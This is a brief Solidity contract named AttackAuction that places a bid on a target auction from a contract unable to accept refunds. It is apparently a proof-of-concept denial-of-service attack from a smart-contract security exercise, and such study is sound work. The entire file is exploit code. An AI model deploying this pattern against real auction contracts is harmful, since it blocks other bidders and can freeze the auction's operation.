// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAuction {
  function bid() external payable;
}

/**
 * @title AttackAuction
 * @author Jay Lee
 */
contract AttackAuction {
  IAuction auction;
  constructor(address _auctionAddress) payable {
    auction = IAuction(_auctionAddress);
    auction.bid{value: msg.value}();
  }
}
